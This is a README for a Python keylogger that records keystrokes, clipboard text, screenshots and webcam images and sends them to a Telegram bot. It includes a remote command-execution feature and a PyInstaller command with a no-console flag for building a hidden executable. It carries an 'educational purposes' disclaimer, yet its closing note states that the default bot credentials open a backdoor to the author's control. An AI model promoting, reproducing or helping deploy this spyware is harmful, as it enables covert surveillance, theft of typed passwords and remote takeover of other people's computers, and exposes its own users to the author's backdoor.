# Python Keylogger with Telegram Integration

A stealthy Python-based keylogger that captures keyboard inputs, clipboard content, and screenshots, and sends them directly to your Telegram bot in real-time. **For educational and ethical testing purposes only.**

## Features

- **Keylogging**: Records all keyboard input.
- **Clipboard Monitoring**: Captures text copied to the clipboard.
- **Screenshot Capture**: Takes screenshots of the user’s screen.
- **Telegram Integration**: Sends logs and screenshots to your Telegram bot automatically.
- **Custom Keybindings**: Supports custom hotkeys for specific actions.

## Installation

1. Clone this repository:
   ```bash
   git clone https://github.com/vux06/Advanced-Keylogger.git
   cd Advanced-Keylogger
   pip install -r requirements.txt
   ```
2. Usage
   ```bash
   python3 logger.pyw
   ```
## You can convert it into an exe file by 

```bash
pyinstaller --onefile --noconsole --icon=myicon.ico your_script.pyw
```

## Custom Commands
- **/camera**: To receive a capture from the Webcam.
- **/rce <COMMAND>**: To execute a system command.

# NOTE: Usage of the code without changing the Bot Token and Chat ID will lead to a BackDoor which reaches me. Which means I am in control of your PC. Happy Hacking...
